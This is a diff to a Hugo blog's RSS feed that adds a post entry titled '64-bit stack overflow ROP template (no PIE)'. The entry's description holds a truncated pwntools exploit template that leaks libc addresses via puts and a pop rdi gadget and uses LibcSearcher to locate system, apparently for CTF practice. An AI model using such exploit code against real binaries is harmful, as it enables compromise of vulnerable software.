@@ -6,7 +6,16 @@
     <description>Recent content in Posts on My New Hugo Site</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 11 Jul 2021 17:26:35 +0800</lastBuildDate><atom:link href="https://shaodongshi.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 12 Jul 2021 17:35:19 +0800</lastBuildDate><atom:link href="https://shaodongshi.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>64位栈溢出rop模板(无PIE)</title>
+      <link>https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</link>
+      <pubDate>Mon, 12 Jul 2021 17:35:19 +0800</pubDate>
+      
+      <guid>https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</guid>
+      <description>64位栈溢出rop模板（无PIE） exp模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &amp;#39;debug&amp;#39; #p = process(&amp;#34;./&amp;#34;) p = remote(&amp;#34;&amp;#34;,) elf = ELF(&amp;#34;./&amp;#34;) read_got = elf.got[&amp;#39;read&amp;#39;] puts_plt = elf.plt[&amp;#39;puts&amp;#39;] main_addr = pop_rdi = #************泄露got********* payload = b&amp;#39;a&amp;#39;*() + p64(pop_rdi) + p64(read_got) payload+= p64(puts_plt) + p64(main_addr) #payload = payload.ljust(200,&amp;#39;b&amp;#39;) p.sendline( payload) p.recvuntil(&amp;#39;&amp;#39;) read_addr = u64(p.recvuntil(&amp;#39;\x0a&amp;#39;)[:-1].ljust(8, &amp;#39;\x00&amp;#39;)) print hex(read_addr) #***************************** #***********搜索libc，寻址******* libc = LibcSearcher(&amp;#34;read&amp;#34;,read_addr) offset = read_addr - libc.dump(&amp;#34;read&amp;#34;) sys_addr = offset + libc.</description>
+    </item>
+    
     <item>
       <title>32位栈溢出rop模板</title>
       <link>https://shaodongshi.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</link>
